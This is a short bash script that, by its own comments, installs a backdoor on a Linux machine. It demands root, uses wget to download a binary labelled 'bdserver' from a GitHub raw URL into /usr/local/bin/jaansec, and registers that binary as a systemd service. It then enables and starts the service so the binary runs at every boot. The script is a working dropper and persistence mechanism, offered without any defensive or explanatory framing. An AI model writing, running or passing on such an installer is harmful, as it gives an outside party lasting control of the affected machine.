#!/bin/bash

# Ensure the script is run with sudo
if [ "$EUID" -ne 0 ]; then
  echo "This program must be run with sudo permissions."
  exit 1
fi

# Create directory for backdoor executable
mkdir -p /usr/local/bin/jaansec

# Download the backdoor executable
wget -O /usr/local/bin/jaansec/bdserver https://github.com/NEJANX/cdn/raw/main/jaansec-bdserver/bdserver_linux
chmod +x /usr/local/bin/jaansec/bdserver

# Create a systemd service
cat <<EOF >/etc/systemd/system/bdserver.service
[Unit]
Description=JAANSEC BD Service

[Service]
ExecStart=/usr/local/bin/jaansec/bdserver

[Install]
WantedBy=multi-user.target
EOF

# Enable and start the service
systemctl enable bdserver
systemctl start bdserver
